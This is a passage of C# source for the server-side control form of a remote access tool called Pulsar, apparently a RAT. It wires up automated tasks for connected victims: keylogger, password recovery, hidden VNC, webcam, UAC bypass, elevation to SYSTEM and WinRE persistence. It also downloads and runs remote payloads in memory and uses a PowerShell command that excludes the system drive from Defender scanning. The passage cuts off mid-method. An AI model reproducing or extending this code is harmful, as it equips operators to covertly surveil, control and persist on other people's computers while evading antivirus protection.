            string filePath = Path.Combine(PulsarStuffDir, "blocked.json");
            List<string> blockedIPs = new List<string>();

            try
            {
                if (File.Exists(filePath))
                {
                    string json = File.ReadAllText(filePath);
                    blockedIPs = JsonConvert.DeserializeObject<List<string>>(json) ?? new List<string>();
                }
            }
            catch (Exception)
            {
            }

            foreach (Client c in clients)
            {
                string clientAddress = c.EndPoint.Address.ToString();
                if (!blockedIPs.Contains(clientAddress))
                {
                    blockedIPs.Add(clientAddress);
                }
                c.Send(new DoClientUninstall());
            }

            try
            {
                string updatedJson = JsonConvert.SerializeObject(blockedIPs, Newtonsoft.Json.Formatting.Indented);
                File.WriteAllText(filePath, updatedJson);
            }
            catch (Exception)
            {
            }
        }

        private void remoteChatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteChat.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        #region AutoTaskStuff

        private void SaveAutoTasks()
        {
            try
            {
                var tasks = lstTasks.Items.Cast<ListViewItem>()
                    .Select(ExtractAutoTask)
                    .ToList();

                File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(tasks, Formatting.Indented));
            }
            catch (Exception ex)
            {
                EventLog($"Failed to save autotasks: {ex.Message}", "error");
            }
        }

        private void LoadAutoTasks()
        {
            lstTasks.Items.Clear();

            if (!File.Exists(AutoTasksFilePath))
            {
                return;
            }

            try
            {
                string fileContent = File.ReadAllText(AutoTasksFilePath);
                if (string.IsNullOrWhiteSpace(fileContent))
                {
                    return;
                }

                var tasks = JsonConvert.DeserializeObject<List<AutoTask>>(fileContent);
                if (tasks == null)
                {
                    return;
                }

                foreach (var task in tasks)
                {
                    AddTask(task, persist: false);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to load autotasks: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private AutoTask ExtractAutoTask(ListViewItem item)
        {
            if (item.Tag is AutoTask task)
            {
                task.Title = item.Text ?? string.Empty;
                task.Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text ?? string.Empty : string.Empty;
                task.Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text ?? string.Empty : string.Empty;
                NormalizeAutoTask(task);
                return task;
            }

            var taskFromItem = new AutoTask
            {
                Title = item.Text ?? string.Empty,
                Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text ?? string.Empty : string.Empty,
                Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text ?? string.Empty : string.Empty
            };

            NormalizeAutoTask(taskFromItem);
            return taskFromItem;
        }

        private void NormalizeAutoTask(AutoTask task)
        {
            if (task == null)
            {
                return;
            }

            task.Title ??= string.Empty;
            task.Param1 ??= string.Empty;
            task.Param2 ??= string.Empty;
            task.Param3 ??= string.Empty;
            task.Param4 ??= string.Empty;
            task.Identifier ??= string.Empty;

            if (string.IsNullOrWhiteSpace(task.Identifier) && _autoTaskBehaviorsByTitle.TryGetValue(task.Title, out var behavior))
            {
                task.Identifier = behavior.Id;
                if (string.IsNullOrWhiteSpace(task.Title))
                {
                    task.Title = behavior.DisplayName;
                }
            }
        }

        private ListViewItem CreateAutoTaskListViewItem(AutoTask task)
        {
            var item = new ListViewItem(task.Title ?? string.Empty);
            item.SubItems.Add(task.Param1 ?? string.Empty);

            string executionModeText = task.ExecutionMode == AutoTaskExecutionMode.OncePerClient ? "[Once]" : "[Every]";
            string argumentsText = task.Param2 ?? string.Empty;
            if (!string.IsNullOrEmpty(argumentsText))
            {
                argumentsText = $"{executionModeText} {argumentsText}";
            }
            else
            {
                argumentsText = executionModeText;
            }

            item.SubItems.Add(argumentsText);
            item.Tag = task;
            return item;
        }

        private void InitializeAutoTaskBehaviors()
        {
            _autoTaskBehaviors.Clear();
            _autoTaskBehaviorsByTitle.Clear();

            // Administration
            RegisterDefaultAutoTask(systemInformationToolStripMenuItem, systemInformationToolStripMenuItem_Click);
            RegisterDefaultAutoTask(fileManagerToolStripMenuItem, fileManagerToolStripMenuItem_Click);
            RegisterDefaultAutoTask(startupManagerToolStripMenuItem, startupManagerToolStripMenuItem_Click);
            RegisterDefaultAutoTask(taskManagerToolStripMenuItem, taskManagerToolStripMenuItem_Click);
            RegisterDefaultAutoTask(remoteShellToolStripMenuItem, remoteShellToolStripMenuItem_Click);
            RegisterDefaultAutoTask(connectionsToolStripMenuItem, connectionsToolStripMenuItem_Click);
            RegisterDefaultAutoTask(reverseProxyToolStripMenuItem, reverseProxyToolStripMenuItem_Click);
            RegisterDefaultAutoTask(registryEditorToolStripMenuItem, registryEditorToolStripMenuItem_Click);

            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                localFileToolStripMenuItem.Name,
                "Remote Execute (Local File)",
                localFileToolStripMenuItem,
                CreateRemoteExecuteLocalAutoTask,
                (frm, client, task) => frm.ExecuteRemoteExecuteLocalAutoTask(client, task)));

            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                webFileToolStripMenuItem.Name,
                "Remote Execute (Web File)",
                webFileToolStripMenuItem,
                CreateRemoteExecuteWebAutoTask,
                (frm, client, task) => frm.ExecuteRemoteExecuteWebAutoTask(client, task)));

            RegisterDefaultAutoTask(shutdownToolStripMenuItem, shutdownToolStripMenuItem_Click);
            RegisterDefaultAutoTask(restartToolStripMenuItem, restartToolStripMenuItem_Click);
            RegisterDefaultAutoTask(standbyToolStripMenuItem, standbyToolStripMenuItem_Click);

            // Monitoring
            RegisterDefaultAutoTask(remoteDesktopToolStripMenuItem2, remoteDesktopToolStripMenuItem_Click);
            RegisterDefaultAutoTask(webcamToolStripMenuItem, webcamToolStripMenuItem_Click);
            RegisterDefaultAutoTask(remoteSystemAudioToolStripMenuItem, remoteSystemAudioToolStripMenuItem_Click);
            RegisterDefaultAutoTask(audioToolStripMenuItem, audioToolStripMenuItem_Click);
            RegisterDefaultAutoTask(hVNCToolStripMenuItem, hVNCToolStripMenuItem_Click);
            RegisterDefaultAutoTask(keyloggerToolStripMenuItem, keyloggerToolStripMenuItem_Click);
            RegisterDefaultAutoTask(passwordRecoveryToolStripMenuItem, passwordRecoveryToolStripMenuItem_Click);
            RegisterDefaultAutoTask(installVirtualMonitorToolStripMenuItem1, installVirtualMonitorToolStripMenuItem1_Click);
            RegisterDefaultAutoTask(uninstallVirtualMonitorToolStripMenuItem, uninstallVirtualMonitorToolStripMenuItem_Click);

            // User support
            RegisterDefaultAutoTask(remoteChatToolStripMenuItem, remoteChatToolStripMenuItem_Click);
            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                remoteScriptingToolStripMenuItem.Name,
                remoteScriptingToolStripMenuItem.Text,
                remoteScriptingToolStripMenuItem,
                CreateRemoteScriptingAutoTask,
                (frm, client, task) => frm.ExecuteMenuItemAutoTask(remoteScriptingToolStripMenuItem, remoteScriptingToolStripMenuItem_Click, client, task)));

            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                showMessageboxToolStripMenuItem.Name,
                showMessageboxToolStripMenuItem.Text,
                showMessageboxToolStripMenuItem,
                CreateShowMessageBoxAutoTask,
                (frm, client, task) => frm.ExecuteMenuItemAutoTask(showMessageboxToolStripMenuItem, showMessageboxToolStripMenuItem_Click, client, task)));

            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                visitWebsiteToolStripMenuItem.Name,
                visitWebsiteToolStripMenuItem.Text,
                visitWebsiteToolStripMenuItem,
                CreateVisitWebsiteAutoTask,
                (frm, client, task) => frm.ExecuteMenuItemAutoTask(visitWebsiteToolStripMenuItem, visitWebsiteToolStripMenuItem_Click, client, task)));

            // Quick commands
            RegisterDefaultAutoTask(addCDriveExceptionToolStripMenuItem, addCDriveExceptionToolStripMenuItem_Click);
            RegisterDefaultAutoTask(enableToolStripMenuItem, enableToolStripMenuItem_Click);
            RegisterDefaultAutoTask(disableTaskManagerToolStripMenuItem, disableTaskManagerToolStripMenuItem_Click);

            // Fun stuff
            RegisterDefaultAutoTask(bSODToolStripMenuItem, bSODToolStripMenuItem_Click);
            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                cWToolStripMenuItem.Name,
                cWToolStripMenuItem.Text,
                cWToolStripMenuItem,
                CreateChangeWallpaperAutoTask,
                (frm, client, task) => frm.ExecuteMenuItemAutoTask(cWToolStripMenuItem, cWToolStripMenuItem_Click, client, task)));
            RegisterDefaultAutoTask(swapMouseButtonsToolStripMenuItem, swapMouseButtonsToolStripMenuItem_Click);
            RegisterDefaultAutoTask(hideTaskBarToolStripMenuItem, hideTaskBarToolStripMenuItem_Click);

            // Client management
            RegisterDefaultAutoTask(elevateClientPermissionsToolStripMenuItem, elevateClientPermissionsToolStripMenuItem_Click);
            RegisterDefaultAutoTask(elevateToSystemToolStripMenuItem, elevateToSystemToolStripMenuItem_Click);
            RegisterDefaultAutoTask(deElevateFromSystemToolStripMenuItem, deElevateToolStripMenuItem_Click);
            RegisterDefaultAutoTask(uACBypassToolStripMenuItem, uACBypassToolStripMenuItem_Click);
            RegisterDefaultAutoTask(installWinresetSurvivalToolStripMenuItem, installWinresetSurvivalToolStripMenuItem_Click);
            RegisterDefaultAutoTask(removeWinresetSurvivalToolStripMenuItem, removeWinresetSurvivalToolStripMenuItem_Click);
            RegisterAutoTaskBehavior(new AutoTaskBehavior(
                winRECustomFileForSurvivalToolStripMenuItem.Name,
                "WinRE Custom File",
                winRECustomFileForSurvivalToolStripMenuItem,
                CreateWinRECustomFileAutoTask,
                (frm, client, task) => frm.ExecuteWinRECustomFileAutoTask(client, task)));
            RegisterDefaultAutoTask(nicknameToolStripMenuItem, nicknameToolStripMenuItem_Click);
            RegisterDefaultAutoTask(blockIPToolStripMenuItem, blockIPToolStripMenuItem_Click);
            RegisterDefaultAutoTask(updateToolStripMenuItem, updateToolStripMenuItem_Click);
            RegisterDefaultAutoTask(reconnectToolStripMenuItem, reconnectToolStripMenuItem_Click);
            RegisterDefaultAutoTask(disconnectToolStripMenuItem, disconnectToolStripMenuItem_Click);
            RegisterDefaultAutoTask(uninstallToolStripMenuItem, uninstallToolStripMenuItem_Click);
        }

        private void RegisterDefaultAutoTask(ToolStripMenuItem menuItem, EventHandler handler, string displayName = null)
        {
            if (menuItem == null || handler == null)
            {
                return;
            }

            var behavior = new AutoTaskBehavior(
                menuItem.Name,
                displayName ?? menuItem.Text,
                menuItem,
                (frm, _) => new AutoTask { Title = displayName ?? menuItem.Text },
                (frm, client, task) => frm.ExecuteMenuItemAutoTask(menuItem, handler, client, task));

            RegisterAutoTaskBehavior(behavior);
        }

        private void RegisterAutoTaskBehavior(AutoTaskBehavior behavior)
        {
            if (behavior == null || string.IsNullOrWhiteSpace(behavior.Id))
            {
                return;
            }

            _autoTaskBehaviors[behavior.Id] = behavior;

            if (!_autoTaskBehaviorsByTitle.ContainsKey(behavior.DisplayName))
            {
                _autoTaskBehaviorsByTitle[behavior.DisplayName] = behavior;
            }

            if (behavior.MenuItem != null && !_autoTaskBehaviorsByTitle.ContainsKey(behavior.MenuItem.Text))
            {
                _autoTaskBehaviorsByTitle[behavior.MenuItem.Text] = behavior;
            }
        }

        private void BuildAutoTaskMenu()
        {
            if (addTaskToolStripMenuItem == null || contextMenuStrip == null)
            {
                return;
            }

            addTaskToolStripMenuItem.DropDownItems.Clear();

            foreach (ToolStripItem item in contextMenuStrip.Items)
            {
                var cloned = CloneMenuItemForAutoTasks(item);
                if (cloned != null)
                {
                    addTaskToolStripMenuItem.DropDownItems.Add(cloned);
                }
            }

            TrimEmptySeparators(addTaskToolStripMenuItem.DropDownItems);
        }

        private ToolStripItem CloneMenuItemForAutoTasks(ToolStripItem item)
        {
            if (item is ToolStripSeparator)
            {
                return new ToolStripSeparator();
            }

            if (item is not ToolStripMenuItem menuItem)
            {
                return null;
            }

            var clone = new ToolStripMenuItem(menuItem.Text, menuItem.Image);

            if (_autoTaskBehaviors.TryGetValue(menuItem.Name, out var behavior))
            {
                clone.Tag = behavior;
                clone.Text = behavior.DisplayName;
                clone.Click += AutoTaskMenuItem_Click;
            }

            foreach (ToolStripItem child in menuItem.DropDownItems)
            {
                var clonedChild = CloneMenuItemForAutoTasks(child);
                if (clonedChild != null)
                {
                    clone.DropDownItems.Add(clonedChild);
                }
            }

            TrimEmptySeparators(clone.DropDownItems);

            if (clone.DropDownItems.Count == 0 && clone.Tag == null)
            {
                return null;
            }

            return clone;
        }

        private static void TrimEmptySeparators(ToolStripItemCollection items)
        {
            if (items == null || items.Count == 0)
            {
                return;
            }

            for (int i = items.Count - 1; i >= 0; i--)
            {
                if (items[i] is ToolStripSeparator)
                {
                    bool remove = i == 0 || i == items.Count - 1;
                    if (!remove && items[i - 1] is ToolStripSeparator)
                    {
                        remove = true;
                    }
                    if (!remove && i + 1 < items.Count && items[i + 1] is ToolStripSeparator)
                    {
                        remove = true;
                    }
                    if (remove)
                    {
                        items.RemoveAt(i);
                    }
                }
            }
        }

        private void AutoTaskMenuItem_Click(object sender, EventArgs e)
        {
            if (sender is not ToolStripMenuItem menuItem || menuItem.Tag is not AutoTaskBehavior behavior)
            {
                return;
            }

            var task = behavior.CreateTask(this);
            if (task == null)
            {
                return;
            }

            task.Title = behavior.DisplayName;
            task.Identifier = behavior.Id;

            NormalizeAutoTask(task);
            AddTask(task);
        }

        private bool TryExecuteAutoTask(AutoTask task, Client client)
        {
            if (task == null || client == null)
            {
                return false;
            }

            AutoTaskBehavior behavior = null;

            if (!string.IsNullOrWhiteSpace(task.Identifier) && _autoTaskBehaviors.TryGetValue(task.Identifier, out behavior))
            {
                // behavior found by identifier
            }
            else if (!string.IsNullOrWhiteSpace(task.Title) && _autoTaskBehaviorsByTitle.TryGetValue(task.Title, out behavior))
            {
                task.Identifier = behavior.Id;
            }

            if (behavior == null)
            {
                return false;
            }

            behavior.Execute(this, client, task);
            return true;
        }

        private void ExecuteMenuItemAutoTask(ToolStripMenuItem menuItem, EventHandler handler, Client client, AutoTask task)
        {
            if (menuItem == null || handler == null || client == null)
            {
                return;
            }

            var previousContext = _currentAutoTaskContext;
            try
            {
                _currentAutoTaskContext = new AutoTaskExecutionContext(new[] { client }, task);
                handler(menuItem, EventArgs.Empty);
            }
            finally
            {
                _currentAutoTaskContext = previousContext;
            }
        }

        private void ExecuteLegacyAutoTask(AutoTask task, Client client)
        {
            if (task == null || client == null || string.IsNullOrWhiteSpace(task.Title))
            {
                return;
            }

            switch (task.Title)
            {
                case "Remote Execute":
                    ExecuteRemoteExecuteLocalAutoTask(client, task);
                    break;
                case "Shell Command":
                    if (!string.IsNullOrWhiteSpace(task.Param2))
                    {
                        string host = string.IsNullOrWhiteSpace(task.Param1) ? "cmd.exe" : task.Param1;
                        client.Send(new DoSendQuickCommand { Host = host, Command = task.Param2 });
                    }
                    break;
                case "Exclude System Drives":
                    if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                    {
                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                        client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                    }
                    break;
                case "Message Box":
                    client.Send(new DoShowMessageBox
                    {
                        Caption = task.Param1 ?? string.Empty,
                        Text = task.Param2 ?? string.Empty,
                        Button = string.IsNullOrWhiteSpace(task.Param3) ? "OK" : task.Param3,
                        Icon = string.IsNullOrWhiteSpace(task.Param4) ? "None" : task.Param4
                    });
                    break;
                case "WinRE":
                    if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                    {
                        client.Send(new DoAddWinREPersistence());
                    }
                    break;
            }
        }

        private AutoTask CreateRemoteExecuteLocalAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            using var openFileDialog = new OpenFileDialog
            {
                Title = "Select file to execute on new clients",
                Filter = "Executable Files (*.exe;*.bat;*.cmd;*.ps1)|*.exe;*.bat;*.cmd;*.ps1|All Files (*.*)|*.*",
                Multiselect = false
            };

            if (openFileDialog.ShowDialog(form) != DialogResult.OK)
            {
                return null;
            }

            string path = openFileDialog.FileName;
            return new AutoTask
            {
                Title = menuItem.Text,
                Param1 = path,
                Param2 = Path.GetFileName(path)
            };
        }

        private void ExecuteRemoteExecuteLocalAutoTask(Client client, AutoTask task)
        {
            string filePath = task?.Param1 ?? string.Empty;
            if (string.IsNullOrWhiteSpace(filePath))
            {
                return;
            }

            if (!File.Exists(filePath))
            {
                EventLog($"AutoTask Remote Execute skipped - file not found: {filePath}", "error");
                return;
            }

            try
            {
                var fileHandler = new FileManagerHandler(client);
                var taskHandler = new TaskManagerHandler(client);
                fileHandler.BeginUploadFile(filePath, string.Empty);
                taskHandler.StartProcess(filePath);
            }
            catch (Exception ex)
            {
                EventLog($"AutoTask Remote Execute failed for '{filePath}': {ex.Message}", "error");
            }
        }

        private AutoTask CreateRemoteExecuteWebAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            string url = string.Empty;
            if (InputBox.Show("Remote Execute (Web)", "Enter the URL to download and execute:", ref url) != DialogResult.OK)
            {
                return null;
            }

            url = (url ?? string.Empty).Trim();
            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show(form, "URL cannot be empty.", "Remote Execute", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return null;
            }

            var updateResult = MessageBox.Show(form, "Treat this payload as an update?", "Remote Execute", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
            if (updateResult == DialogResult.Cancel)
            {
                return null;
            }

            bool isUpdate = updateResult == DialogResult.Yes;

            var reflectionResult = MessageBox.Show(form, "Execute in memory using .NET reflection (for managed payloads)?", "Remote Execute", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
            if (reflectionResult == DialogResult.Cancel)
            {
                return null;
            }

            bool executeInMemory = reflectionResult == DialogResult.Yes;

            if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
            {
                url = "http://" + url;
            }

            return new AutoTask
            {
                Title = menuItem.Text,
                Param1 = url,
                Param2 = isUpdate ? "Update Mode" : "Execute",
                Param3 = isUpdate.ToString(),
                Param4 = executeInMemory.ToString()
            };
        }

        private void ExecuteRemoteExecuteWebAutoTask(Client client, AutoTask task)
        {
            string url = task?.Param1 ?? string.Empty;
            if (string.IsNullOrWhiteSpace(url))
            {
                return;
            }

            if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
            {
                url = "http://" + url;
            }

            bool isUpdate = bool.TryParse(task?.Param3, out var update) && update;
            bool executeInMemory = bool.TryParse(task?.Param4, out var reflection) && reflection;

            try
            {
                var taskHandler = new TaskManagerHandler(client);
                taskHandler.StartProcessFromWeb(url, isUpdate, executeInMemory);
            }
            catch (Exception ex)
            {
                EventLog($"AutoTask Remote Execute (web) failed for '{url}': {ex.Message}", "error");
            }
        }

        private AutoTask CreateRemoteScriptingAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            using (var dialog = new FrmRemoteScripting(0))
            {
                if (dialog.ShowDialog(form) != DialogResult.OK)
                {
                    return null;
                }

                return new AutoTask
                {
                    Title = menuItem.Text,
                    Param1 = dialog.Lang ?? string.Empty,
                    Param2 = dialog.Hidden ? "Hidden" : "Visible",
                    Param3 = dialog.Script ?? string.Empty,
                    Param4 = dialog.Hidden.ToString()
                };
            }
        }

        private AutoTask CreateShowMessageBoxAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            using (var dialog = new FrmShowMessagebox(0))
            {
                if (dialog.ShowDialog(form) != DialogResult.OK)
                {
                    return null;
                }

                return new AutoTask
                {
                    Title = menuItem.Text,
                    Param1 = dialog.MsgBoxCaption ?? string.Empty,
                    Param2 = dialog.MsgBoxText ?? string.Empty,
                    Param3 = dialog.MsgBoxButton ?? "OK",
                    Param4 = dialog.MsgBoxIcon ?? "None"
                };
            }
        }

        private AutoTask CreateVisitWebsiteAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            using (var dialog = new FrmVisitWebsite(0))
            {
                if (dialog.ShowDialog(form) != DialogResult.OK || string.IsNullOrWhiteSpace(dialog.Url))
                {
                    return null;
                }

                return new AutoTask
                {
                    Title = menuItem.Text,
                    Param1 = dialog.Url ?? string.Empty,
                    Param2 = dialog.Hidden ? "Hidden" : "Visible",
                    Param3 = dialog.Hidden.ToString()
                };
            }
        }

        private AutoTask CreateChangeWallpaperAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            using (var openFileDialog = new OpenFileDialog
            {
                Title = "Select wallpaper image",
                Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif|All Files (*.*)|*.*",
                Multiselect = false
            })
            {
                if (openFileDialog.ShowDialog(form) != DialogResult.OK)
                {
                    return null;
                }

                string path = openFileDialog.FileName;
                return new AutoTask
                {
                    Title = menuItem.Text,
                    Param1 = path,
                    Param2 = Path.GetFileName(path)
                };
            }
        }

        private AutoTask CreateWinRECustomFileAutoTask(FrmMain form, ToolStripMenuItem menuItem)
        {
            string program = string.Empty;
            if (InputBox.Show("WinRE Custom File", "Enter the program path to execute from WinRE:", ref program) != DialogResult.OK)
            {
                return null;
            }

            program = (program ?? string.Empty).Trim();
            if (string.IsNullOrWhiteSpace(program))
            {
                return null;
            }

            string arguments = string.Empty;
            InputBox.Show("WinRE Custom File", "Enter command-line arguments (optional):", ref arguments);

            return new AutoTask
            {
                Title = "WinRE Custom File",
                Param1 = program,
                Param2 = (arguments ?? string.Empty).Trim()
            };
        }

        private void ExecuteWinRECustomFileAutoTask(Client client, AutoTask task)
        {
            if (client?.Value == null)
            {
                return;
            }

            bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";
            if (!isClientAdmin)
            {
                if (_currentAutoTaskContext == null)
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    EventLog($"Skipping WinRE custom file task for {client.Value.Username} - client not elevated.", "warn");
                }
                return;
            }

            client.Send(new AddCustomFileWinRE
            {
                Path = task?.Param1 ?? string.Empty,
                Arguments = task?.Param2 ?? string.Empty
            });
        }

        private void winREToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            AddTask("WinRE", string.Empty, string.Empty);
        }

        private sealed class AutoTaskExecutionContext
        {
            public AutoTaskExecutionContext(Client[] clients, AutoTask task)
            {
                Clients = clients ?? Array.Empty<Client>();
                Task = task;
            }

            public Client[] Clients { get; }

            public AutoTask Task { get; }
        }

        private sealed class AutoTaskBehavior
        {
            private readonly Func<FrmMain, ToolStripMenuItem, AutoTask> _createTask;
            private readonly Action<FrmMain, Client, AutoTask> _executeTask;

            public AutoTaskBehavior(string id, string displayName, ToolStripMenuItem menuItem, Func<FrmMain, ToolStripMenuItem, AutoTask> createTask, Action<FrmMain, Client, AutoTask> executeTask)
            {
                Id = id ?? string.Empty;
                DisplayName = displayName ?? string.Empty;
                MenuItem = menuItem;
                _createTask = createTask ?? ((form, item) => null);
                _executeTask = executeTask ?? ((form, client, task) => { });
            }

            public string Id { get; }

            public string DisplayName { get; }

            public ToolStripMenuItem MenuItem { get; }

            public AutoTask CreateTask(FrmMain form)
            {
                return _createTask(form, MenuItem);
            }

            public void Execute(FrmMain form, Client client, AutoTask task)
            {
                _executeTask(form, client, task);
            }
        }

        #region "Search Functionality"

        private TextBox _searchTextBox;
        private Label _searchLabel;
        private Label _searchResultsLabel;

        private void InitializeSearch()
        {
            _searchTextBox = new TextBox
            {
                Visible = false,
                Location = new System.Drawing.Point(220, 10),
                Size = new System.Drawing.Size(300, 23),
                TabIndex = 0,
                Font = new System.Drawing.Font("Segoe UI", 9F),
                PlaceholderText = "Search clients... (press Esc to close)"
            };
            _searchTextBox.TextChanged += SearchTextBox_TextChanged;
            _searchTextBox.KeyDown += SearchTextBox_KeyDown;

            _searchLabel = new Label
            {
                Text = "🔍 Search:",
                Visible = false,
                Location = new System.Drawing.Point(150, 13),
                Size = new System.Drawing.Size(65, 15),
                Font = new System.Drawing.Font("Segoe UI", 9F),
                ForeColor = System.Drawing.Color.FromArgb(64, 64, 64)
            };

            _searchResultsLabel = new Label
            {
                Text = "",
                Visible = false,
                Location = new System.Drawing.Point(530, 13),
                Size = new System.Drawing.Size(200, 15),
                Font = new System.Drawing.Font("Segoe UI", 8F),
                ForeColor = System.Drawing.Color.FromArgb(96, 96, 96)
            };

            tabPage1.Controls.Add(_searchTextBox);
            tabPage1.Controls.Add(_searchLabel);
            tabPage1.Controls.Add(_searchResultsLabel);

            _searchTextBox.BringToFront();
            _searchLabel.BringToFront();
            _searchResultsLabel.BringToFront();
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Control | Keys.F))
            {
                ShowSearch();
                return true;
            }
            else if (keyData == Keys.Escape && _searchTextBox.Visible)
            {
                HideSearch();
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void ShowSearch()
        {
            if (MainTabControl.SelectedTab != tabPage1) return;

            _searchLabel.Visible = true;
            _searchTextBox.Visible = true;
            _searchResultsLabel.Visible = true;
            _searchTextBox.Focus();
            _searchTextBox.SelectAll();
            UpdateSearchResultsCount();
        }

        private void HideSearch()
        {
            _searchLabel.Visible = false;
            _searchTextBox.Visible = false;
            _searchResultsLabel.Visible = false;
            _currentSearchFilter = "";
            _searchTextBox.Text = "";
            ApplySearchFilter();
            lstClients.Focus();
        }

        private void SearchTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
            {
                HideSearch();
            }
        }

        private void SearchTextBox_TextChanged(object sender, EventArgs e)
        {
            _currentSearchFilter = _searchTextBox.Text.Trim();
            ApplySearchFilter();
            UpdateSearchResultsCount();
        }

        private void ApplySearchFilter()
        {
            if (string.IsNullOrEmpty(_currentSearchFilter))
            {
                ShowAllClients();
                return;
            }

            string searchLower = _currentSearchFilter.ToLowerInvariant();

            lstClients.BeginUpdate();
            try
            {
                var itemsToRemove = new List<ListViewItem>();

                foreach (ListViewItem item in lstClients.Items)
                {
                    if (item.Tag is Client client)
                    {
                        bool matches = false;

                        for (int i = 0; i < item.SubItems.Count; i++)
                        {
                            string text = item.SubItems[i].Text?.ToLowerInvariant() ?? "";
                            if (text.Contains(searchLower))
                            {
                                matches = true;
                                break;
                            }
                        }

                        if (!matches)
                        {
                            string nickname = GetClientNickname(client)?.ToLowerInvariant() ?? "";
                            string publicIp = (client.Value?.PublicIP ?? client.EndPoint?.Address?.ToString() ?? "").ToLowerInvariant();

                            if (nickname.Contains(searchLower) || publicIp.Contains(searchLower))
                            {
                                matches = true;
                            }
                        }

                        if (!matches)
                        {
                            itemsToRemove.Add(item);
                        }
                    }
                }

                foreach (var item in itemsToRemove)
                {
                    if (item.Tag is Client client)
                    {
                        if (!_allClientItems.ContainsKey(client))
                        {
                            _allClientItems[client] = item;
                        }
                        _visibleClients.Remove(client);
                    }
                    lstClients.Items.Remove(item);
                }
            }
            finally
            {
                lstClients.EndUpdate();
            }

            ApplyWpfSearchFilter();
        }

        private void ShowAllClients()
        {
            lstClients.BeginUpdate();
            try
            {
                foreach (var kvp in _allClientItems)
                {
                    var client = kvp.Key;
                    var item = kvp.Value;

                    if (!lstClients.Items.Contains(item))
                    {
                        if (client.Value != null)
                        {
                            string country = client.Value.Country ?? "Unknown";
                            string countryWithCode = client.Value.CountryWithCode ?? "Unknown";
                            item.Group = GetGroupFromCountry(country, countryWithCode);
                        }
                        lstClients.Items.Add(item);
                        _visibleClients.Add(client);
                        SyncWpfEntryFromListViewItem(item);
                    }
                }
                _allClientItems.Clear();

                SortClientsByFavoriteStatus();
            }
            finally
            {
                lstClients.EndUpdate();
            }

            ApplyWpfSearchFilter();
        }

        private bool ShouldShowClientInSearch(Client client, ListViewItem item)
        {
            if (string.IsNullOrEmpty(_currentSearchFilter))
                return true;

            string searchLower = _currentSearchFilter.ToLowerInvariant();

            for (int i = 0; i < item.SubItems.Count; i++)
            {
                string text = item.SubItems[i].Text?.ToLowerInvariant() ?? "";
                if (text.Contains(searchLower))
                {
                    return true;
                }
            }

            string nickname = GetClientNickname(client)?.ToLowerInvariant() ?? "";
            string publicIp = (client.Value?.PublicIP ?? client.EndPoint?.Address?.ToString() ?? "").ToLowerInvariant();

            if (nickname.Contains(searchLower) || publicIp.Contains(searchLower))
            {
                return true;
            }

            return false;
        }

        private bool ShouldShowClientInSearch(Client client, ClientListEntry entry)
        {
            if (entry == null)
            {
                return false;
            }

            if (string.IsNullOrEmpty(_currentSearchFilter))
                return true;

            string searchLower = _currentSearchFilter.ToLowerInvariant();

            static bool Matches(string value, string search)
                => !string.IsNullOrEmpty(value) && value.IndexOf(search, StringComparison.OrdinalIgnoreCase) >= 0;

            if (Matches(entry.Ip, searchLower) || Matches(entry.Nickname, searchLower) || Matches(entry.Tag, searchLower) ||
                Matches(entry.UserAtPc, searchLower) || Matches(entry.Version, searchLower) || Matches(entry.Status, searchLower) ||
                Matches(entry.CurrentWindow, searchLower) || Matches(entry.UserStatus, searchLower) || Matches(entry.CountryWithCode, searchLower) ||
                Matches(entry.OperatingSystem, searchLower) || Matches(entry.AccountType, searchLower))
            {
                return true;
            }

            string nickname = GetClientNickname(client)?.ToLowerInvariant() ?? string.Empty;
            string publicIp = (client.Value?.PublicIP ?? client.EndPoint?.Address?.ToString() ?? string.Empty).ToLowerInvariant();

            return nickname.Contains(searchLower) || publicIp.Contains(searchLower);
        }

        private void UpdateSearchResultsCount()
        {
            if (string.IsNullOrEmpty(_currentSearchFilter))
            {
                _searchResultsLabel.Text = "";
                return;
            }

            int visibleCount = lstClients.Items.Count;
            int totalCount = visibleCount + _allClientItems.Count;

            if (visibleCount == totalCount)
            {
